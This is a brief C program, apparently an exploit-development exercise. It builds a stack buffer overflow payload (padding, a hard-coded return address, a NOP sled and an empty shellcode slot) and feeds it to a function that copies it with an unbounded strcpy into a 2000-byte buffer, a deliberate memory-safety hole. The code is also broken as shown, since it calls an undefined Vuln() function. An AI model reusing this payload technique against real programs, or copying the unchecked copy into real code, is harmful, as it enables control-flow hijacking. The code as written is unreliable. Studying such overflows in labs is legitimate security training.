#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

void Function(char *Input);

int main(int argc, char *argv[]) {
    Vuln();
    char buff[10000];
    memset(buff, 'A', 2012);
    
    char addr[] = "\x4c\x14\x50\x62";
    
    char nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    unsigned char code[] = "";
    memcpy(buff + 2012, addr, sizeof(addr) - 1);
    memcpy(buff + 2012 + sizeof(addr) - 1, nop, sizeof(nop) - 1);
    memcpy(buff + 2012 + sizeof(addr) - 1 + sizeof(nop) - 1, code, sizeof(code) - 1);
    
    Function(buff);

    return 0;
}

void Function(char *Input) {
    char Buffer2S[2000];
    strcpy(Buffer2S, Input);
}
